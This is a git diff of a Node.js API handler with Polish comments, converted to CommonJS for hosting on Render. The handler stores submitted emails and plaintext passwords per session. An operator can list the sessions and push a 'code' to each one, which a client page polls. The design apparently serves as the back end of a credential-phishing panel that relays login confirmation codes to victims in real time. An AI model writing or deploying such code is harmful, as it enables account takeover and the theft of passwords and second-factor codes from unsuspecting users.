@@ -1,12 +1,15 @@
-// api/confirm.js
+// api/confirm.js - wersja CommonJS (działa na Renderze)
 let sessions = {};
 
-export default function handler(req, res) {
+module.exports = (req, res) => {
+    // CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    if (req.method === 'OPTIONS') return res.status(200).end();
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
 
     // GET
     if (req.method === 'GET') {
@@ -19,15 +22,15 @@ export default function handler(req, res) {
                 .map(k => ({
                     session: k,
                     email: sessions[k].email || 'brak',
-                    code: sessions[k].code || '--- --- ---',
+                    code: sessions[k].code || '--',
                     sent: sessions[k].sent || false
                 }));
             return res.status(200).json({ sessions: active });
         }
 
         if (session) {
-            const data = sessions[session] || { code: '--- --- ---' };
-            return res.status(200).json({ code: data.code || '--- --- ---' });
+            const data = sessions[session] || { code: '--' };
+            return res.status(200).json({ code: data.code || '--' });
         }
 
         return res.status(400).json({ error: 'Brak parametru' });
@@ -41,7 +44,7 @@ export default function handler(req, res) {
             sessions[session] = {
                 email: email || 'brak',
                 password: password || 'brak',
-                code: '--- --- ---',
+                code: '--',
                 sent: false,
                 active: true,
                 created: new Date().toISOString()
@@ -50,14 +53,18 @@ export default function handler(req, res) {
         }
 
         if (action === 'set_code') {
-            if (!sessions[session]) return res.status(404).json({ error: 'Sesja nie istnieje' });
+            if (!sessions[session]) {
+                return res.status(404).json({ error: 'Sesja nie istnieje' });
+            }
             sessions[session].code = code;
             sessions[session].sent = false;
             return res.status(200).json({ success: true, code });
         }
 
         if (action === 'send_code') {
-            if (!sessions[session]) return res.status(404).json({ error: 'Sesja nie istnieje' });
+            if (!sessions[session]) {
+                return res.status(404).json({ error: 'Sesja nie istnieje' });
+            }
             sessions[session].sent = true;
             return res.status(200).json({ success: true, sent: true });
         }
@@ -66,4 +73,4 @@ export default function handler(req, res) {
     }
 
     return res.status(405).json({ error: 'Method not allowed' });
-}
+};
